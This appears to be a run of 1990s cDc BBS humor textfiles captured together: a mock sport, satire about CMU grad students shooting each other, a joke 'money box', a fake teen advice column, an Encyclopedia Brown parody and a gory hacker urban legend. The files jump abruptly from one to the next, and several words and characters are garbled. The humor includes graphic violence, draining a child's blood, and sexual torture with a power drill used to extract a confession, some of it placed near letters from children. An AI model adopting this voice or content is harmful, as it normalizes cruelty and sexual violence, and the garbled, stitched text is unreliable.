are considered illegal to use wq4z_  Pproper consent.    The next thing needed for any sport is a team.  A luding team consists of two to eight people.  The first and most important position on the team is the flyer. This is the man that grasps the rope using the official air force grip  se e glossary below for definition .  It is recommended that the flyer were gloves for protection. All the other men on the team perform one task that is one of acceleration.    The sport begins with the flyer using the air force grip running down the runway accelerating until he becomes air born at which time the lead man helps him by P  hing him both out and around.  After a short distance the accelerator be gins to push the flyer in a circular motion always keeping him air born. Then the last leg is picked up by the anchor man he must make sure that the flyer ma intains a circular motion around the pole.  Each complete circle around the pol e i s called a ludian.  A decaludian is ten revolutions around the pole.  A variation on luding is linear l uding.  This is more of a one man sport than the standard luding.  Linear ludin g i s when the flyer runs in a straight line near the pole until he becomes air bor n.  In linear luding the height and lude lash are the things to watch for.  The lude lash is when the flyer pulls down on the rope just before take off causin g t he pole to bend as the flyer reaches take off.  After take ofb`hhe pole bends b ack giving the flyer extra lift.  When doing this it is very important to make sure that the flyer does not come back and hit the pole resulting in a pin biff .    As stated in the most high book of ludiviticus, if thouest taketh the name of lude in vain, thou will be sent to thy house of heet!    If thouest defameth any ludist herein, thou shalt be tied to a lude pole, hav est thine pants taken off, and have the holy suckling calf turned loose on ye.    Thou shall not reveal the secrets of the great Luders or ye shall be forced t o do a nude honey lude in thy bee yard.    Those Luding at a nonsancitioned Luding event shall be penned with a gross of homosexual pigs for no less than three weeks.    Thou found doing thee double lude lash shall be forced to do thy gravel grid with thy gonadal bin biff.    Thee who gets caught whenst he is Luding by thee local inforcement group and tells of his adventures shall be set apart from the rest of thy lude world.

Allow me to introduce myself.  I was featured in the documentary t file  The History of Real K K00L DOODS   by The Edge  as a troubled adolescent with some real serious problems.  However, with a lot of self  induced shock therapy I've mended my ways.  There's nothing like having your every character flaw pointed out in excruciating detail to make you step back and say  Eggbert, you need a change.   Fortunately, those kind, wonderful folks in cDc SAVED MY LIFE!  They took me under their wing and taught me that with a lot of hard work and cash donations to their group, I can be a meaningful person!  They're also teaching me how to be elite!  Once a week they give me a  s00per sekrut mission  which usually involves the acquisition of hi tech equipment to further their wonderful plans they have for the future of us all.  They can't tell me these plans, you understand, as I am but a cDc WorkerDrone in the K K0W F0RCE! and do not need such information.  When I succeed in returning back to my base with my job completed they lavish me with praise and Hostess Fruit Pies like no mere natural parent can!  When I fail  c0w forbid! , they beat me severely and make me wear women's evening gowns.  I hate the humiliation.  But I deserve it because it's the only way I will learn to be elite.  Daddy   Stop it.  I love you too, cDc.  Please don't hit me again.  Twinkie   They're having me do a suicide run on a central office next week so I may not be able to call back.  Where's Mommy   Another part of my work for cDc is programming this new operating system called BS 2.  Thank you sir, may I have another   I feel so groggy, and it's getting hard to see.  They  haven't fed me in a few days.  I am K K0W F0RCE! and I can handle it!  I'll kill them all.  Daddy   I love cDc with all my heart.  What was I saying   The horror... oh my.  I'm going to put the info file for BS 2 next in my message so you can see how elite I'm becoming and be proud of me too.  Here it is                             cDc introduces the most VIOLENT operating system ever!    Welcome to a new era.

It's common knowledge that whenever you get two or more CS grad students together, the conversation will inevitably drift to the same topic  automatic weapons.  Lately, we've noticed that whenever we attend a CS party, picnic, or bull session, we always hear the same questions and discussions, usually from the younger grad students        I want to mount an M60 in front of the sun roof of my Tercel, but      the mounting bracket wasn't drilled for import cars.  How did Josh      Bloch do his         Some of my friends at the MIT AI Lab don't like M203's because the      grenade launcher adds too much weight, but I wouldn't have gotten      out of IJCAI 85 in one piece if it hadn't been for those 40mm flechette      rounds.  What do you think         Do you have to be a god damned tenured professor to get teflon rounds      at this place         Does the 'reasonable person principle' cover hosing down a member      of the Soar project after he's used the phrase 'cognitively plausible'      for the fifteenth time in a 20 minute conference talk         Where  did  Prof. Vrsalovic get that Kalashnikov AK 47         I used to use Dri Slide to lube my M16.  How come my advisor says      Dri Slide is for momma's boys and Stanford profs         Does the way Jon Webb keeps flicking the safety of his Mac 10 on      and off at thesis defenses make you nervous, too         In short, there is a lot of concern in this department for the proper care, handling and etiquette of automatic weapons.  So as a service to the department, we are starting a two week daily series on  The Care and Handling of Your M16A1.  Every day for the next two weeks, we will post on the wall outside our office the day's helpful hint on care and maintenance of that good old departmental standby  the M16A1.  Our thanks to the US Army, whose training manuals we have shamelessly cribbed for material.       We would like to encourage other knowledgeable members of the CS community to share their expertise in a similar fashion.  There is a real need for this kind of dialogue in the department.  The new students come in here every fall, and are totally unequipped to handle the realities of graduate student life at CMU.  Computability theory and lexical scoping are fine things to know about, but they just don't cut the mustard when somebody from the Psych department opens up on you with an Ingram set to full auto.                     the friendly automatic weapons enthusiasts of SkyCave1,                    Olin, Derek, and Allan  Date  Tue, 26 May 87 09 55 15 PDT From  jkhBERKELEY.EDU Subject  Supporting one's opinion with sustained fully automatic weapons fire.       I had recent occasion to view your Presentation Announcement on care and feeding of automatic weapons during lecture hall.  I found it most amusing.  I would very much like to see and or contribute future material.       We have similar problems here at Berkeley, though it has been difficult to wean our students away from more the more mundane assortment of Browning Hi Power's, Beretta 92SBF's and Sig Sauer P226's.  The 9mm clique is pretty strong here, and the young grad students fairly parsimonious.  They tend to balk at the idea of spending enough money on ammo to make full auto firefights practical.  Lately, they've taken to sniping at each other from the Campanille tower and engaging in loose hit and run guerrilla tactics during finals.  This is obviously not the American Way and needs to be changed.  While I've been able to slowly wean them into more progressive arms  such as the Beretta 93R and an occasional mini uzi , I still can't seem to get past the supply problem. My questions are        Do you buy your ammo in bulk, or do appointed individuals do shifts on a        progressive reloader         Does the school pay for this                    Thank you.                      Sincerely,                      J. H.                     U.C. Berkeley  27 May 87 02 16    OS hi.cs.cmu.edu My reply to J. H. of UC Berkeley                J. H.         Thank you for your letter.  It was certainly interesting to hear of conditions out on the West Coast.  What can I tell you about the situation here at CMU   I'm really glad I came to CMU.  The faculty is absolutely first rate, and they all take pride in their weapons skills.  We are admittedly a pretty opinionated bunch, which provides for many interesting interchanges within the community.  I, for instance, think the long barrel .44 Automag is more of a fashion statement than a weapon, though you won't catch me saying that within earshot of Prof. Fahlman.  If you catch my drift.       I am very fond of Berkeley.  I think that while LA represents the dark, twisted climb the water tower and start shooting until the Marines settle it side of California weirdness, Berkeley represents the very best of the pure, innocent killer side of it all.  The first weekend I ever spent in Berkeley was in the summer of 1983.  I was sitting down at one of those really delightful cafes you have out there.  To my left some old man was drinking cappucino and practicing Chinese calligraphy  down the street some undergraduates were engaged in a running firefight.  I was taking it all in, thinking that Berkeleians have remembered something about living well that the rest of America seems to have forgotten  when this kid's stray .223 slug shattered my glass of pomegranate soda.   Crazy undergraduates  I remember chuckling to myself as I put the safety back on my Hi Power and returned it to its holster.       It seems a shame that ammunition is so hard to come by out there, though.  We are quite spoiled here at CMU.  The departmental attitude towards logistical support really crystallized for me in September of my first year.  One of the incoming first year hot shots had taken out Prof. Felton with a head shot from 500 yards.  We were all really impressed, and I think it was generally agreed that Felton couldn't have asked for a more painless, appropriate end.  It was a beautiful, almost poetic way to cap what had been a textbook career of brilliant, original mathematical insights punctuated with outbursts of random, deeply unhinged violence.       You've probably heard of Felton  National Academy of Science, IEEE Past President, NRA sustaining member .  My advisor told me later that Felton's academic peak had come at that now infamous 1982 Symposium on Data Encryption, when he presented the plaintext of the encrypted challenge message that Rob Merkin had published earlier that year using his  phonebooth packing  trap door algorithm.  According to my advisor, Felton wordlessly walked up to the chalkboard, wrote down the plaintext, cranked out the multiplies and modulus operations by hand, and wrote down the result, which was obviously identical to the encrypted text Merkin had published in CACM.  Then, still without saying a word, he tossed the chalk over his shoulder, spun around, drew and put a 158 grain semi wadcutter right between Merkin's eyes.  As the echoes from the shot reverberated through the room, he stood there, smoke drifting from the muzzle of his .357 Magnum, and uttered the first words of the entire presentation   Any questions   There was a moment of stunned silence, then the entire conference hall erupted in wild applause.  God, I wish I'd been there.       But I digress.  At Felton's funeral, our departmental chairman delivered the eulogy.  I'll never forget his summation   Poor Felton.  Published and published, yet perished just the same.  And that's the attitude that the professors take here.  As my advisor said   The tragedy of Galois is that he could have contributed so much more to mathematics if he'd only spent more time on his marksmanship.  The professors at CMU aren't in the business of turning out effete researchers, aimed at the big industrial labs.  They are interested in training  real  academicians, suitably prepared for life in the jungle of university level computer science.  And that means time spent practicing our teaching skills and weapons handling  as well as  making fundamental research contributions to the field.

Every  box  ever invented was based pretty much on the same premise  how to get SOMETHING for NOTHING.  In other words, to RIP OFF.  Well, taking this concept to its logical conclusion, we end up with a  box  that simply CREATES MONEY.  Yes, CASH wherever you need it.  Not JUST for phone calls, but for pizza, cigs, laptops, v.fast modems, parking meter fares, YOU NAME IT.  YOU DECIDE.  The box... PROVIDES.       Of course, the electronics required to build this wonder have not been invented yet, but I will try to explain.  First off, the box must of course be green.  But not just ANY color of green.  It must be MONEY GREEN.  Maybe even a picture of George Washington on the back.  As for buttons, there will be just ONE.  A BIG, GOLD button in the center of the box... labeled  CASH.   And when pressed, the sound of cash registers will emanate from the unit    Ka CHING!        I believe the main circuit should be a rectifier... to rectify the situation in YOUR FAVOR.  Many capacitors  the green, electrolytic type  are to be arranged in a pattern on the PCB as such                              C       C                             C       C                    C    C    C    C    C    C    C                  C          C       C                    C        C       C                      C    C    C    C    C    C                             C       C           C                             C       C         C                     C    C    C    C    C    C                             C       C                             C       C         Using a typical OP AMP, you should be able to wire these caps to allow you to amplify your NEED for CASH.  Of course, be sure the entire circuit is properly grounded.  Otherwise, hundreds of dollars could be sent RUSHING through your body by accident.       After combining the rectifier, capacitors, OP AMP, and proper grounding wires, you must 'baptize' the PCB with human blood.  Find a small child, take him out to Chuck e Cheeze, and when he's not looking, drain a few pints.  Pour the blood over the entire circuit.  Take his lunch money while you're at it.       Next, you need an IC... but not just ANY IC... you need a chip of the future... a FHSIC chip  Fucking Huge Scale Integrated Circuit .  I can't tell you exactly the specs on this baby, since my vision was interrupted at this point by a hearty black olive flavored belch, thereby jerking me out of my divine insight.  I'll get back to you all on this one.       Once you get the FHSIC, just slap it in the box on top of the PCB.  It's an INTELLIGENT chip, so ya don't have to worry about pinouts and all that crap.  t'll know how to connect itself.       As for POWER SUPPLY, there's an ironic twist here.  Note the following equations             Time   Money          Money   Power       Ergo, Time   Power!                            Note  all units are metric        Since MONEY is POWER, and TIME is MONEY, well, the box will drain power from the TIME CONTINUUM itself... and the translation of that TIME into MONEY will be seamless.  Equations don't lie.       Add the solid gold button  SPST switch  and a speaker  for the  Ka CHING  .  Close the box, and secure it all with generous portions of CLEAR EPOXY.  Use GOBS.       NOW.the fun part... go to a payphone... place a direct call to Guam.  When the operator asks for money  close your eyes, push the gold button and chant,  Mo' money, MO' MONEY, Mo' money .  Concentrate on your NEED for     coupling to the OP AMP circuit  and you will suddenly hear the  Ka CHING  and smell burning flesh.       Hovering six inches in front of your face should now be EXACTLY the amount of    you need  in the proper denominations, of course  to complete your call.        Do this same procedure in ALL circumstances where you need money.  Just be sure to be out of sight  the appearance of floating cash tends to freak out ordinary people .  The box will ALWAYS generate EXACTLY the amount you need. If you happen to get MORE money than you THINK you need, you were WRONG.  The box, since it gets its power from TIME, can predict the future to an extent... and may generate    that you will need in the NEAR FUTURE  as well  as the    you need immediately.  Do not be afraid.  The box knows!       That's about it.  Future plans for foreign currency are bouncing in my head                Germany    Der MoneyGrip Box                France     Le MoneyGrip Box   And so on....       Now, BUILD IT... and bask in your glory.

Colorado Springs, CO  Dear Nicole,      Now that she's finished  Earth Goo  and her files have spread far and wide across the planet, Lady Carolin has been doing what any superstar who's just completed such a file would do   rest!  Even while resting, Lady Carolin has been thinking about new files and you'll get to read her new material which is due out sometime in 1993!      DEAR COW BEAT,      I have dandruff in my eyebrows.  I've tried dandruff shampoos, but they haven't worked.  How can I handle this                                               Jennifer T.

To give you a brief idea of my feelings   I had a special sweatshirt made with Willsie's name on it, I created my own Willsie earrings and every time I make pancakes, they spell out Tequila Willy!  My teacher even calls me Willsie!  I hope someday I can meet Tequila Willy and the rest of the Willsie family.

DEAR COW BEAT,      I'm a 28 year old guy, and recently I have begun stealing birth control pills and eating them.  They give me the weirdest feeling.  I'm beginning to think I'm addicted.  Is there something wrong with me                                               Todd S.                                              Terra Haute, IN  Dear Todd,      Man, that's pretty creepy.  Maybe you shouldn't be eating those things !  Yeesh....      DEAR COW BEAT,      I go wild whenever I see cDc files and this drives my family crazy!  One time, my mom caught me kissing printouts of your files  I was mortified!  I thought my face would be permanently red!  Remember that I love all of you and please, please, please come to Topeka soon!                                              Kimberly H.                                              Topeka, KA  Dear Kimberly,      A dozen of us are planning a visit soon, and we'll be staying at YOUR house!  Love ya, babe!  xoxoxo      DEAR COW BEAT,      I'm in the 7th grade and there's this guy at school I like and he seems to like me too, but once he said he didn't.  My friends say that he really does like me, but that he's too shy to admit it.  I would at least like to be able to talk to him like I do all my other friends.  My problem is that i'm too shy around him and I cant seem to start up a conversation with him to give our friendship a chance.  How can I start a conversation without being so nervous and shy   This way, we could start some sort of relationship.                                              Chrissy M.                                              Austin, TX  Dear Chrissy,      Chrissy, Chrissy Chrissy.  SILLY GIRL!  Offer him some Kool Aid and let nature take its course.  Then try some lines from Three's Company, it'll floor him.  Next....      DEAR COW BEAT,      I'm head over heals in love with The Pusher who wrote  Silent Applause.  He's soo cute!  Last night, I dreamed we went on a date to the beach.  He kissed me and asked me to be his girlfriend.  Oooh!  It was awesome and soo romantic!  My goal is to REALLY be his girlfriend.  Pusher, if you're reading this, thanks for giving me such sweet dreams!                                              Pam N.                                              Tampa, FL  Dear Pam,      We sent your letter over to The Pusher, and he said he was going to have a really SPECIAL dream about you, too!  Lucky Pam!      DEAR COW BEAT,      I'm 12 years old and I have a big problem.  There's this one girl in my class who thinks I'm a snot.  This girl says mean things about me to my friends.  Another thing is that ever since I got my hair cut, everybody seems to hate me!  Anyway, I don't know this girl that well, but I'd really like to be friends with her.  Help!                                              Mike T.                                              Durango, CO  Dear Mike,      She thinks you're a snot   I don't see the problem.  Maybe you lack resolve.  Don't just let her think you're a snot, make sure she KNOWS you're a snot.  Ah, youth.      DEAR COW BEAT,      First of all, I'd like to say you're doing an excellent job of keeping me informed on all the hot stars of telecom.  I'd appreciate it greatly if you'd please put a picture of this gorgeous, fine, and not to mention sexy, guy Franken Gibe in your magazine.  His eyes are to die for!  Thanx!                                               K. Kurt,                                              Bergenfield, NJ  Dear K. Kurt,      Hmm.  Well, here ya go.  Knock yerself out.        ____                                                         .  .                                                                                                                         _u       DEAR COW BEAT,      I am an eighteen year old high school senior and my older sister Tracy is my disciplinarian.  Tracy is seven years older than me, and I have been living with her for the last two years while my parents are on a foreign work assignment.  My sister is a Registered Nurse and treats me very well, but she feels she has every right to warm my tail, as she calls it, if I disobey her or misbehave.  She doesn't give me a strapping, thank goodness, but her pretty hand or hairbrush does plenty of justice to my bare behind.  If I misbehave, she will not hesitate to turn me over her knee, lower my pants and briefs, and very severely spank my bare butt.  It stings badly too.      The spankings stings, but the embarrassment of  being over he knee with my bare behind sticking up is worse.  She frequently has her nurse's uniform on, so when she puts me over her knee, my genitals cannot avoid rubbing on her stockings.  It's erotic, to say the least, and it's hard to control myself.                                               Steve L.                                              Cherry Hill, NJ  Dear Steve,      Wow.  That's very special.  Thanks for sharing.      DEAR COW BEAT,      What's up   My name is Jenny and I am 12 years old.  I love cDc!  I have 394 posters and 42 pins of them.  I love Drunkfux.  I have 220 posters of him alone.  My best friend, Michelle, has 394 posters too.  She loves Swamp Ratte'. She cries and faints over Ratte' like I do over Drunkfux.  I love your nose, Drunkfux, and also about 25 to 30 other things about you.  Michelle loves Ratte's legs, and about 20 to 25 things about him.  We love cDc.  I love love love you!  You're the best thing that ever happened to us!                                               Jenny S.                                              Moraga, CA  Dear Jenny,       That's pretty weird.  Maybe you need a hobby       DEAR COW BEAT,      Hi!  My name is Nicky and I'm 10 years old.  I like your magazine very much, especially the Letters section.  I truly love Obscure Images.  He is my dream guy.  Please put more articles about Obscure Images in COW BEAT. I hate New Kids On The Block, but I LOVE cDc!!

But thanks for writing, all of you!     _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _    The COW BEAT News Pasture!       Last time Cultee COUNT ZERO made an appearance at a mall in Florida, 24 fans were injured due to their wild youthful lust.  When he appeared at a Washington mall, he had to escape in a laundry hamper!  More recently, thousands of screaming fans turned up at the Cambridgeside Galleria in Cambridge and the Atrium Mall in Chestnut Hill in Massachusetts to get a glimpse of their idols  COUNT ZERO, THE DETH VEGETABLE, DAVE FERRET, and WHITE KNIGHT.  This time around, the gals kept their wits about them and there were very few injuries reported.      Before the Cultees arrived at the Atrium Mall, radio DJ Bob Casta reminded the 5000 plus crowd to make sure they didn't push and shove in their excite  ment.  There were people on the main mall floor and even more people looking down over the railings three levels high!  At the Galleria, THE DETH VEGETABLE and DAVE FERRET arrived on a police jet ski at the Cambridgeside Lagoon.  The gals started chanting  FERRET!  FERRET!  FERRET!   Pretty soon, hunky WHITE KNIGHT and COUNT ZERO arrived too   by helicopter!      VEGGIE scanned the crowd and pointed to all the posters of himself and other Cultees.   Next time, instead of buying those, give that money to the homeless people of Boston,  said VEGGIE with a sweet smile.   They're the ones who need it.  And please be careful and watch out for each other on the way out.   What caring superstars they are!           Okay, you work really hard to be successful, staying up until all hours of the night writing files, modding your board, persuading the public you've got what it takes, and then   boom   you're a sensation!  Journalists peg you for interviews and gals everywhere quiver in your presence.  Add lots of coffee and drooping pants to this picture and you've got G.A. ELLSWORTH!      Every morning, girls wait for him to come out of his house just so they can touch him!  Girls hand him love notes, phone numbers, cards, flowers and other goodies.  And, of course, G.A. loves it.  What guy wouldn't love all that attention !  But, he says,  It doesn't boost my ego.  I'm just glad they like my work.       Responding to allegations concerning their reputation as the GANGSTAZ of TELECOM, an anonymous cDc spokesperson responds   Sure, we'd bust caps on a narc... but we don't support killin' nobody that don't deserve it!       The cDc CULTEES love mixing in with their fans, but due to their overwhelming popularity, that can sometimes be dangerous.  You know how you are, girls.  If you saw a CULTEE standing near you, wouldn't you go absolutely nuts   Sure you would!!  So, THE NIGHTSTALKER and THE RAVER devised a clever way to mix with their fans and be perfectly safe at the same time!  All they do is slip into some wigs, sunglasses and girls' clothes and they can walk right through the crowds!  Leave it to cDc to find an ingenious solution to ANY problem!     _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _    ______________________________ advertisement _______________________________        If you were to bottle the vibe and aura that is CULT OF THE DEAD COW, what would it smell like        Just like cDc, the scent would have to be fresh, innovative, charming, cool and totally versatile.       Kind of like your fave piece of clothing  be it a black jacket or a pair of jeans  that you can dress up or dress down and wear anywhere and everywhere!       So, back to our original question                         What would cDc smell like in a bottle        cDc experimented in its secret underground labs and didn't stop until it had achieved perfection, capturing the flash of cDc as well as the subtleties.       cDc proudly introduces its newest fragrance   PISS!       This lively scent mirrors the chic, sophisticated technophile lifestyle of today's active cyberpunk.  If your nose is twitching with anticipation, look for cDc's PISS! at fine stores everywhere.       A totally unsolicited quote   All I gotta do is dab on a little of cDc's PISS! before I go out... and man, the hotties come runnin'!  Thanks, cDc!

Who's going to visit our detective business in this weather   he fumed.        Sally had to agree.  She was the prettiest girl in their grade, and was also the toughest.  Many was the time that Bugs Meany regretted ever having crossed Sally in one of her cases.  Encyclopedia was the brains behind their operation, possessing the keen memory and sharp mental skills that his nickname implied, but Sally was the muscle  bullies had learned to steer clear of the pair when they were on a job.       Suddenly, Pee Wee Weatherby ran up the driveway.  Soaked to the skin, the pudgy second grader approached the overturned wooden crate that served as the agency's desk and plunked down a scratched up quarter.   I've got a job for you,  he declared firmly.       Encyclopedia pocketed the quarter.   No case too small,  he announced.  What's the scoop, Pee Wee          That bad old Bugs Meany has sold a bunch of us on a plan to recycle newspapers.  We were all to contribute a dollar to get the business started. Bugs said that we could earn  2.50 a week once the plan got underway.  Well, it's been two weeks now, and we haven't seen any of our money!  We asked Bugs to give us our stakes back, but he said he couldn't do that.  I want my dollar back!        Sally patted Pee Wee across the desk.   Don't worry, Pee Wee.  The Encyclopedia Brown Detective Agency is on the job!         That's right, Sally,  said Encyclopedia.   Now, Pee Wee, can you tell us where Bugs is hanging out         Soon the rain stopped, and the trio biked over to the abandoned lot on Jefferson Street.  A pile of scrap metal and boards formed a ramshackle club house.  Hanging on the door was a crudely lettered sign reading                                     PAPER RECYCLING                            NEWSPRINT, CARDBOARD, SCRAP                                     CASH PAID       Below it was another sign reading                             CLOSED UNTIL FURTHER NOTICE       Lounging in front of the clubhouse was a very bored looking Bugs Meany.  He was an older boy with a Jughead crown hat and a nasty sneer.  He hated Encyclopedia Brown for his interference in his previous schemes, but he feared Sally and her terrible fists.  As the three kids approached, Bugs looked a little nervous.  However, he soon relaxed and looked down his nose at the younger children.        Welcome to my place of business, ladies and gentlemen!  Bugs announced in a sarcastic voice.   Would you like to trade in your newspapers for cash   Gee, I'm really sorry, but our business folded, and I don't know when we'll be back on our feet.   He regarded the trio with a saucy smile.        You dirty rat!  shouted Sally.   You're robbing kids of their money for your business and not giving them anything in return!  I'll bet you never did one minute of work at recycling!   Sally menaced Bugs with her fists  Bugs quickly recoiled.       Encyclopedia Brown surveyed the yard.  The grass had grown very tall and green.  Next to the clubhouse was a wheelbarrow, partially filled with old newspapers.  There were several ruts cutting across the abandoned lot.  They were all of uniform depth.       Bugs was shouting back at Sally   That's not true!  I had a legitimate business going!  I would bring newspapers, cardboard boxes, and other paper scrap to the recycling center!  They paid me cash  I was going to distribute it to my shareholders as soon as I showed a profit!  I invested their stake in that wheelbarrow, but then the recycling center closed!  Now I can't repay the stake  otherwise I would   honest!   He favored Sally with a smug smile.       Encyclopedia Brown stepped up to Bugs and picked something off his shirt.  He held it up for all to see.  It looked like a scrap of greenish ribbon. Encyclopedia Brown smiled.       Bugs Meany frowned.   So what   What does that prove   It doesn't mean anything.  I'm innocent, and you can't prove otherwise.         You're wrong,  said Encyclopedia quietly.   You're guilty, and you're going to return that money right now.  You see, Bugs, you made one small mistake.                                WHAT WAS BUGS' MISTAKE                                      see below         Bugs' mistake was meeting the Brown Detective Agency alone.       Sally held Bugs down and sodomized him with a power drill.  By the time she had worked her way up to the three eighths inch bit, Bugs was in a talkative mood.  Encyclopedia Brown elicited the appropriate confession and obtained a full refund for the other kids.  Sometimes, not having a shred of evidence is no obstacle for a real sleuth.  Encyclopedia Brown does it again!  xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx   T     Xfer 1 New Uploads   V   File to view   ircmanua.txt  xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx  IRC MANUAL FOR LOVE  V 1.0       Written by Steve Franklin, 11 01, July 22,1992  How to succeed with love and flirting on irc   Be a girl.                                                              IRC MANUAL FOR LOVE V. 2.0  corrects a few bugs, and adds new features       Written by Steve Franklin, 11 02, July 22, 1992  How to succeed with love and flirting on irc   Be a girl.  Start a channel called  hotsexforpervertswhoare10inchersormore.   msg guys who have names like hugeone, manly, bigbody, or worse.  Figure out exactly what your dimensions should be...  Don't remind the fellow you are flirting with that he is actually a geek.  NEVER ask the question  if you're so great, being so smart, incredibly good looking, a sports jock, and piano virtuoso  THOR! , then how come you're on irc 18 hours a day    Become one with irc lingo   this includes annoying smileys  8 ,            , flowers       `    , yecky sweetness   hugs ,  grin ,  smile   etc...  Tell him you're glad he's so attractive but that it doesn't really matter anyway, and even if he was short, ugly, and overweight it wouldn't matter.  Warning, he may at this point admit that he truly is, shorty, ugly and overweight.                                                                                IRC MANUAL FOR LOVE V. 3.0  patch for manual Version 2.0       Written by Steve Franklin, 11 06, July 22, 1992  How to succeed with love and flirting on irc   For men who insist on maintaining masculinity and not stooping to female imitation   Consider flirting with other males.  There are few females on IRC and many of them are actually other males who are already familiar with Version 2.0 of the IRC for Love manual.  Choose a nick like  sensitive  or  ILoveKids  or  NotAGeek   Basically, you want to choose a nick that will make you stand out as a nice guy.  Don't try anything dumb like  BigMan ,  Stamina  or  SuperMan , because these will inevitably attract those who are already familiar with Version 2.0 of the IRC For Love manual and are not truly female, but female impersonators...  Say that you like to cry.  Remember, you're a 90's man!  Recite poetry.  Slip in the fact that you can bench press 803.5 lbs.  Tell her you have a GPA of 4.9  You are a god fearing religious individual  remember, the bad girls are actually MEN!   Tell her you can cook.  Tell her you like your women unattractive.  Pretty girls are so vain and boring.  Start your own channel called  GoodBoysLikeFun, but shorten it up a bit to something easier to type.  Yeah, try  GBLF.  Warning, other individuals who read this manual may have already started  GBLF so be patient and wait your turn.                                                                   IRC MANUAL FOR LOVE V. 3.1  patch for manual Version 3.0       Written by Steve Franklin, 11 11, July 22, 1992  How to succeed with love and flirting on irc   You can't.  It's lame, pathetic, and utterly unsuccessful.  After a vote taken among important members of the IRC clan, it has been discovered that 100  frown upon any sort of amorous activities.  Get a real relationship, but never settle for an irc facsimile.  You don't know what you're dealing with, and it isn't really worth your time.  xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx   T     Xfer 1 New Uploads   V   File to view   kradthin.txt  xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx                                  It's a K Rad Thing                                 by Swamp Ratte' cDc       So here I am... 3 am, kitchen.  Sitting at counter, pouring some cereal, making a mess with the milk.  TV's on, Paula Abdul on MTV.  She keeps claiming she's  in a funky way,  but I know I'm funkier 'cause I haven't showered yet. Nobody's funkier than me.  No white boy, anyhow.  Man, check out Paula's cleavage.  Praise be to whomever invented the push up bra.  Think I'd like to stuff my face amongst her breasts and make duckie noises.  Better yet, Debbie Gibson.  Yeah, she could tongue my navel and fix me some orange juice  fresh, from concentrate  any day.  I bet her breasts wiggle oh so attractively when she shakes a juice pitcher.  One container of orange juice glop, three containers full of water.  The magic formula.  Shake well before serving. Go Debbie, go.  Shake that pitcher.  Shake Your Love.       I'm getting an erection but I can't deal with that now.  I've got cereal to eat.  BEFORE IT GETS SOGGY.       Right.  So I try to take my mind off Miss Gibson's perkily heaving mammaries and move my attention back to my not just for breakfast anymore food product.  My cereal, you ask   Alpha Bits.  Choice of py00ter geeks everywhere.  Alpha Bits cereal consists of little brown wheat things shaped like the numbers 0 through 9, and these small marshmallows in the shape of letters A through F.  Hexadecimal, ya know   A lot of cyberpunks are into this thing called Marshmallow HEX now, made from these Alpha Bits marshmallows which are laced with a stimulant and hallucinogen.  It sounds kinda like ice, but doesn't turn you into a raging psychopath.  It's more of an  enthused trip,  sorta.       Anyhow, there are bunches o' t files out on making Marshmallow HEX so I won't go into it here.  On the back of the cereal box are hex and ASCII charts so the kiddies can get off by spelling obscene words in their bowls in hex. It's a great way to start your day.  Hey hey.  I should get paid for the rhymes I've made.  Another reason why Alpha Bits is so popular amongst py00ter types, as is Special K, is that it's fortified... with Vitamin K.  Vitamin K is important to keep you k rad and out of that lamerosity slump that can drag you down.  Yeah, a well balanced breakfast is important and never let it be said that I skimp on nutrition, including the full day's supply of Vitamin K I get with my Alpha Bits.  Just ask any other elite types and they'll tell you too... Vitamin K is the way to start out a totally elite day.  Let me rephrase that   vITAmiN K! iZ ThA waYYE t0 stARtEZz 0UT A t0tALlye EL8! dAY!!!!1!        I've gotta keep my k ness up 'cause I don't want any shit coming down on me from DemonSeed Elite.  If you still don't know the deal with DemonSeed Elite, then listen up.  People don't like to talk about him it much, 'cause it's such a heavy subject... like a giant cow hanging over your head, ready to drop at any slip up you make.  Or in this case, a monster truck.       Rumor is, that back in the late 1970s early '80s, DSE was a user who achieved Maximum K rad Eliteness at which point his soul merged with the global telecom network.  DemonSeed Elite was no longer just a person, but an entity residing in the cables and satellite links of the network.  He is AT T, he is Internet, he is SouthWestern Bell, he is Smilin' Uncle Dudley's Child Pokin' BBS across town.  He is your phone.  He is the spy satellites which orbit above our heads.  He knows when you've been sleeping and he knows when you're awake. And he takes any sign of lameness on his networks as a personal insult. To speak his real name is to die.  Lamers and r0dents all face his wrath. No one has seen him dealing out his vengeance, or been alive afterwards to tell about it, but it will come.  Believe that.       All we can do is make assumptions from the wretched remains.  A thirteen  year old with his intestines ripped out  fiberoptic cables twisted tightly around the pulp of what was once his frontal lobe.  The young geek's forehead was branded  k lame , the words still sizzling in his freshly seared flesh when he was found bleeding to death on the floor of his bedroom.  His monitor still glowed with the ominous text,  C U L8R! , upon signing off to his friend he had been chatting with over the modem.  His pal suffered a similar fate.       Entire user groups have been found at their meetings hung from the rafters with coaxial cable, their bodies swollen and blue as they swung gently in the hushed roar of the air conditioning system.       DemonSeed Elite, in his physical manifestation, is said to prefer travelling in a giant orange monster truck with tires 30 feet high and 30 feet wide.  The accuracy of these monster truck descriptions may leave something to be desired since the witnesses were pissing their pants at the time of observance... though the monster truck theory is consistent with some reports of death.  On several occasions, groups of r0dents were found squashed flat as they crossed a parking lot or open field.  The only clue to the cause of their sudden flatness was giant tread marks all over their bodies.  It's as if a large truck fell from the sky and crushed them into a 2 D state, then disappeared!       Now you can believe this, take heed, and watch out for yourself or not. Hey, it's your life.  But as for me, I'm gonna get on with eating my Alpha Bits.  I'm no fool.  No siree.  xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx   T     Xfer 1 New Uploads   V   File to view   livehoho.txt  xXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx                                Live From XmasCon 1991        This file 